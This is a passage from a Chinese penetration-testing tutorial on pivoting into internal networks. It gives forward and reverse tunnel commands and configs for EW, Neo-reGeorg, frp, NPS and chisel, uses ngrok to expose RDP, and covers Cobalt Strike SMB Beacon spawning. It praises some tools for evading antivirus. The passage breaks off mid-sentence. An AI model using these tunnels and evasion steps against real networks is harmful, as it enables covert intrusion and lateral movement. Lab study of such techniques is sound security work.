alt="在这里插入图片描述"></p><p>EW是一套便携式的网络工具，具有SOCKS5服务架设和端口转发两大核心功能，可以在复杂的网络环境中实现网络穿透。同时EW能够以正向，反向，多级级联等方式建立网络隧道。<br>（1）正向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s ssocksd -l 8888<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210510172723317.png" alt="在这里插入图片描述"><br>在socksCap64添加这个IP地址的代理<br><img src="https://img-blog.csdnimg.cn/20210510172826510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在攻击机上访问内网目标主机：<br><img src="https://img-blog.csdnimg.cn/20210511183932818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>（2）反向连接<br>在web服务器上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew -s rssocks -d 192.168.43.234 -e 1111<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511185158276.png" alt="在这里插入图片描述"></p><p>在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ew  -s rcsocks -l 1008 -e 888<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511185217485.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210511185347436.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>更多参考：<a href="https://www.freebuf.com/sectool/259634.html">https://www.freebuf.com/sectool/259634.html</a></p><p><strong>Neo-reGeorg</strong><br>它是由reGeorg经过大佬改版的。<br>它的优势是做了加密处理，避免特征检测，生成的脚本也免杀！！<br>实验环境：<br><img src="https://img-blog.csdnimg.cn/20210511205417330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>首先先生成加密脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python .\neoreg.py generate -k one<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511205721691.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210511205746823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>攻击上运行进行隧道建立</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python neoreg.py -k one -u http://192.168.43.58/tunnel.php<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511205832821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>成功建立的连接<br>配置本地代理</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi /etc/proxychains.conf<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511205854993.png" alt="在这里插入图片描述"><br>测试与目标机连通<br><img src="https://img-blog.csdnimg.cn/202105112059058.png" alt="在这里插入图片描述"><br><strong>frp</strong><br>攻击机设置frps.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>bind_port = 6666<br></code></pre></td></tr></table></figure><p>运行如下命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">frps.exe -c frps.ini<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511210815522.png" alt="在这里插入图片描述"></p><p>在边缘机器设置frpc.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr = 192.168.10.3<br>server_port = 6666<br>[http_proxy]<br><span class="hljs-built_in">type</span>=tcp<br>remote_port=7777<br>plugin=socks5<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511211513845.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511211800156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>NPS</strong><br>NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">项目地址：https://github.com/ehang-io/nps/releases/tag/v0.26.9 <br></code></pre></td></tr></table></figure><p>服务端配置文件如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs bash">appname = nps<br><span class="hljs-comment">#Boot mode(dev|pro)</span><br>runmode = dev<br><br><span class="hljs-comment">#HTTP(S) proxy port, no startup if empty</span><br>http_proxy_ip=0.0.0.0<br>http_proxy_port=80     <span class="hljs-comment">#域名代理http代理监听端口</span><br>https_proxy_port=443   <span class="hljs-comment">#域名代理https代理监听端口(一般会修改这两个端口，避免端口冲突)</span><br>https_just_proxy=<span class="hljs-literal">true</span><br><span class="hljs-comment">#default https certificate setting</span><br>https_default_cert_file=conf/server.pem<br>https_default_key_file=conf/server.key<br><br><span class="hljs-comment">##bridge</span><br>bridge_type=tcp      <span class="hljs-comment">#客户端与服务端连接方式kcp或tcp</span><br>bridge_port=8024     <span class="hljs-comment">#服务端客户端通信端口，也就是说客户端通过访问服务端的这个端口可以进行连接</span><br>bridge_ip=0.0.0.0<br><br><span class="hljs-comment"># Public password, which clients can use to connect to the server</span><br><span class="hljs-comment"># After the connection, the server will be able to open relevant ports and parse related domain names according to its own configuration file.</span><br>public_vkey=123      <span class="hljs-comment">#客户端以配置文件模式启动时的密钥，设置为空表示关闭客户端配置文件连接模式</span><br><br><span class="hljs-comment">#Traffic data persistence interval(minute)</span><br><span class="hljs-comment">#Ignorance means no persistence</span><br><span class="hljs-comment">#flow_store_interval=1   #服务端流量数据持久化间隔，单位分钟，忽略表示不持久化</span><br><br><span class="hljs-comment"># log level LevelEmergency-&gt;0  LevelAlert-&gt;1 LevelCritical-&gt;2 LevelError-&gt;3 LevelWarning-&gt;4 LevelNotice-&gt;5 LevelInformational-&gt;6 LevelDebug-&gt;7</span><br>log_level=7         <span class="hljs-comment">#日志输出级别</span><br><span class="hljs-comment">#log_path=nps.log</span><br><br><span class="hljs-comment">#Whether to restrict IP access, true or false or ignore</span><br><span class="hljs-comment">#ip_limit=true      #是否限制ip访问，true或false或忽略</span><br><br><span class="hljs-comment">#p2p</span><br><span class="hljs-comment">#p2p_ip=127.0.0.1    #服务端IP，使用p2p模式必填</span><br><span class="hljs-comment">#p2p_port=6000       #p2p模式开启的udp端口</span><br><br><span class="hljs-comment">#web</span><br>web_host=a.o.com<br>web_username=admin   <span class="hljs-comment">#web界面管理账号</span><br>web_password=123     <span class="hljs-comment">#web界面管理密码</span><br>web_port = 8080      <span class="hljs-comment">#web管理端口，通过访问该端口可以访问NPS后台</span><br>web_ip=0.0.0.0<br>web_base_url=        <span class="hljs-comment">#web管理主路径,用于将web管理置于代理子路径后面</span><br>web_open_ssl=<span class="hljs-literal">false</span><br>web_cert_file=conf/server.pem<br>web_key_file=conf/server.key<br><span class="hljs-comment"># if web under proxy use sub path. like http://host/nps need this.</span><br><span class="hljs-comment">#web_base_url=/nps</span><br><br><span class="hljs-comment">#Web API unauthenticated IP address(the len of auth_crypt_key must be 16)</span><br><span class="hljs-comment">#Remove comments if needed</span><br><span class="hljs-comment">#auth_key=test       #web api密钥</span><br>auth_crypt_key =1234567812345678    <span class="hljs-comment">#获取服务端authKey时的aes加密密钥，16位</span><br><br><span class="hljs-comment">#allow_ports=9001-9009,10001,11000-12000</span><br><br><span class="hljs-comment">#Web management multi-user login</span><br>allow_user_login=<span class="hljs-literal">false</span><br>allow_user_register=<span class="hljs-literal">false</span><br>allow_user_change_username=<span class="hljs-literal">false</span><br><br><br><span class="hljs-comment">#extension</span><br>allow_flow_limit=<span class="hljs-literal">false</span><br>allow_rate_limit=<span class="hljs-literal">false</span><br>allow_tunnel_num_limit=<span class="hljs-literal">false</span><br>allow_local_proxy=<span class="hljs-literal">false</span><br>allow_connection_num_limit=<span class="hljs-literal">false</span><br>allow_multi_ip=<span class="hljs-literal">false</span><br>system_info_display=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#cache</span><br>http_cache=<span class="hljs-literal">false</span><br>http_cache_length=100<br><br><span class="hljs-comment">#get origin ip</span><br>http_add_origin_header=<span class="hljs-literal">false</span><br><br><span class="hljs-comment">#pprof debug options</span><br><span class="hljs-comment">#pprof_ip=0.0.0.0       #debug pprof 服务端IP</span><br><span class="hljs-comment">#pprof_port=9999        #debug pprof 端口</span><br><br><span class="hljs-comment">#client disconnect timeout</span><br>disconnect_timeout=60   <span class="hljs-comment">#客户端连接超时，单位 5s，默认值 60，即 300s = 5mins</span><br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511234440814.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>运行即可：<br><img src="https://img-blog.csdnimg.cn/20210511234539451.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>登录web界面   admin&#x2F;123<br>配置<br><img src="https://img-blog.csdnimg.cn/2021051123462283.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511234702300.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击添加<br><img src="https://img-blog.csdnimg.cn/20210511234729659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210511234901339.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>客户端配置文件：</p><p>友情提示:这里将配置文件写出来主要是为了让大家了解配置文件的内容，如果觉得配置文件太过繁琐，大多数情况下只需要关注server_addr、conn_type、和vkey这三个参数即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs bash">[common]<br>server_addr=127.0.0.1:8024<br>conn_type=tcp<br>vkey=123<br>auto_reconnection=<span class="hljs-literal">true</span><br>max_conn=1000<br>flow_limit=1000<br>rate_limit=1000<br>basic_username=11<br>basic_password=3<br>web_username=user<br>web_password=1234<br>crypt=<span class="hljs-literal">true</span><br>compress=<span class="hljs-literal">true</span><br><span class="hljs-comment">#pprof_addr=0.0.0.0:9999</span><br>disconnect_timeout=60<br><br>[health_check_test1]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_http_url=/<br>health_check_type=http<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[health_check_test2]<br>health_check_timeout=1<br>health_check_max_failed=3<br>health_check_interval=1<br>health_check_type=tcp<br>health_check_target=127.0.0.1:8083,127.0.0.1:8082<br><br>[web]<br>host=c.o.com<br>target_addr=127.0.0.1:8083,127.0.0.1:8082<br><br>[tcp]<br>mode=tcp<br>target_addr=127.0.0.1:8080<br>server_port=10000<br><br>[socks5]<br>mode=socks5<br>server_port=19009<br>multi_account=multi_account.conf<br><br>[file]<br>mode=file<br>server_port=19008<br>local_path=/Users/liuhe/Downloads<br>strip_pre=/web/<br><br>[http]<br>mode=httpProxy<br>server_port=19004<br><br>[udp]<br>mode=udp<br>server_port=12253<br>target_addr=114.114.114.114:53<br><br>[ssh_secret]<br>mode=secret<br>password=ssh2<br>target_addr=123.206.77.88:22<br><br>[ssh_p2p]<br>mode=p2p<br>password=ssh3<br><br>[secret_ssh]<br>local_port=2001<br>password=ssh2<br><br>[p2p_ssh]<br>local_port=2002<br>password=ssh3<br>target_addr=123.206.77.88:22<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">server_addr   <span class="hljs-comment">#服务端ip/域名:port</span><br>conn_type       <span class="hljs-comment">#与服务端通信模式(tp或kcp)</span><br>vkey           <span class="hljs-comment">#服务端配置文件中的密钥</span><br></code></pre></td></tr></table></figure><p>配置好后直接运行即可  npc.exe<br>也可以不要配置文件运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><br>Windows：<br>    npc.exe -server=ip:8024 -vkey=P@ssword<br>Linux：<br>    ./npc -server=xx.xx.xx.xx:8024 -vkey=P@ssword<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210511235510587.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在线了<br><img src="https://img-blog.csdnimg.cn/20210512000057985.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210512000038984.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>通过内网地址连接到主机</p><p><strong>chisel</strong><br>项目地址：<a href="https://github.com/jpillora/chisel/releases/tag/v1.7.4">https://github.com/jpillora/chisel/releases/tag/v1.7.4</a></p><p>Chisel 可用来搭建内网隧道，类似于常用的 frp 和 nps 之类的工具。由于目前使用的人比较少，因此对于有些杀软还不能准确的识别出该工具。chisel 可以进行端口转发、反向端口转发以及 Socks 流量代理，使用 go 语言编写，支持多个平台使用，是进行内网穿透的一个鲜为人知的好工具</p><p>工具使用：<br>这个工具和其他工还有一点不同，就是没有服务器和客户端，只有一个可执行文件。可以通过执行这个文件，让其充当服务器端或者客户端</p><p>查看帮助信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查看客户端帮助信息</span><br>chisel server -<span class="hljs-built_in">help</span><br>chisel client -<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><ul><li>端口转发<br>（1）正向连接<br>在目标机上开启服务监听：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512091258690.png" alt="在这里插入图片描述"><br>在攻击上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.215:1234 1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p>意思是将目标机的3389端口转发到本地的1111端口上<br><img src="https://img-blog.csdnimg.cn/2021051209140521.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210512091438504.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>连上了。<br>（2）反向连接<br>在目标机中执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:1234 R:1111:127.0.0.1:3389<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512092315906.png" alt="在这里插入图片描述"></p><p>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 1234 --reverse<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512092128746.png" alt="在这里插入图片描述"><br>在本地访问127.0.0.1就是访问的目标机的3389<br><img src="https://img-blog.csdnimg.cn/20210512092411365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>socks代理<br><img src="https://img-blog.csdnimg.cn/20210512093321254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>（1）正向连接<br>在攻击上执行：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel client 192.168.43.215:12345 socks<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512105454698.png" alt="在这里插入图片描述"><br>在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512105530657.png" alt="在这里插入图片描述"></p><p>（2）反向连接<br>在攻击机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe server -p 12345 --reverse<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512104450907.png" alt="在这里插入图片描述"><br>在跳板机上执行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chisel.exe client 192.168.43.234:12345 R:socks<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20210512104542308.png" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/2021051210461310.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>在攻击上访问内网主机：<br><img src="https://img-blog.csdnimg.cn/20210512104649655.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2ODA0NTUx,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li><p><strong>ngrok</strong><br>  ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试<br>  特点<br>  官方维护，一般较为稳定</p><p>  跨平台，闭源</p><p>  有流量记录和重发功能</p></li></ul><p>进入ngrok官网（<a href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7">https://ngrok.com/），注册ngrok账号</a><br>创建隧道，如下<br><img src="https://img-blog.csdnimg.cn/71f87b07ff4b46caa0eb6fb8e4589a29.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>将3389端口代理出来<br><img src="https://img-blog.csdnimg.cn/59db4f30326a43ab86dadd9538f4ca89.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>下载客户端<br><img src="https://img-blog.csdnimg.cn/2255684e1632434593579f0be0f5f524.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>在目标机上运行客户端<br><img src="https://img-blog.csdnimg.cn/140425729e0c47b68afbe6bd90961f56.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>输入这里的id<br><img src="https://img-blog.csdnimg.cn/c833afffbefb42bc92c485466b6329d8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>成功<br><img src="https://img-blog.csdnimg.cn/fd1bdbbca8334f15bf0207eb15c66c6e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d0cab615406e482f87afd668246c4990.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBALk9uZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><ul><li><p><strong>smb beacon上线</strong><br>官网介绍：SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons连接后，子Beacon从父Beacon获取到任务并发送。<br>因为连接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB Beacon相对隐蔽，绕防火墙时可能发挥奇效</p><p> <strong>这种Beacon要求具有SMB Beacon的主机必须接受端口445上的连接。</strong><br> 派生一个SMB Beacon方法：在Listner生成SMB Beacon&gt;目标主机&gt;右键&gt; spawn &gt;选中对应的Listener&gt;上线<br> 或在Beacon中使用命令spawn smb（smb为我的smb listener名字)<br> <img src="https://img-blog.csdnimg.cn/9b653d1ab2054a2cbd2ba11a7d16c9e9.png" alt="在这里插入图片描述"></p></li></ul><p>使用插件，或自带端口扫描，扫描内网机器<br><img src="https://img-blog.csdnimg.cn/9e3a4a7b7c00438aa22d296d1a4811a5.png" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/f7c29fa003d544e1bc595bd78a6df2cb.png" alt="在这里插入图片描述"><br>转到视图，选择目标<br><img src="https://img-blog.csdnimg.cn/ad771c85c6474474907c57f4876054c4.png" alt="在这里插入图片描述"><br>在之前我们要先抓一波密码</p><p>运行成功后外部可以看到∞∞这个字符，这就是派生的SMB Beacon。<br>当前是连接状态，你可以Beacon上用link <ip>命令链接它或者unlink 